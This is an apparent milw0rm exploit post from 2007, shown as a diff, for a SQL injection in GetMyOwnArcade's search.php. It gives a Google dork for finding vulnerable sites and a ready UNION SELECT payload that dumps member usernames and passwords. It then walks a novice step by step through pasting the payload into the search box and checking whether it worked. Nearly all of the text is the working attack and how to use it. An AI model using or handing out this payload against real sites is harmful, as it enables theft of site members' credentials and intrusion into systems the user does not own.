@@ -1,0 +1,46 @@
+###############################################
+### GetMyOwnArcade (search.php) ($query) SQL-Injection
+###############################################
+### Discovered By: RoXur777
+### ***August 11th 2007
+### Google-Dork: "Powered by GetMyOwnArcade"
+###############################################
+/*
+* $query is not being filtered before getting passed to a query.
+* Therefore, we can inject SQL code into the SQL-Query.
+* Using UNION-SELECT we can obtain member information.
+*/
+###
+##
+#Straight-Forward:
+#####################
+### POST
+### search.php
+###"query=')/**/union/**/select/**/0,0,0,username,0,0,0,0,0,password,0,0,0,0,0,0,0,0/**/from/**/getmyown_user/*"
+#####################
+###
+##
+#
+If you did not understand the Straight-Forward version of the exploit then read this:
+###
+#
+1) Use the search function on a GetMyOwnAracde site. (They are not always visible on index.php)
+2) In the search field type:
+#
+#######
+')/**/union/**/select/**/0,0,0,username,0,0,0,0,0,password,0,0,0,0,0,0,0,0/**/from/**/getmyown_user/*
+#######
+#
+3) Click Enter.
+4) If exploitation was successful you should see usernames and passwords instead of the search results.
+---
+However if you see:
+#
+#######
+Game search result for \')/**/union/**/.......
+#######
+#
+That means that the exploit failed.
+#
+
+# milw0rm.com [2007-08-16]
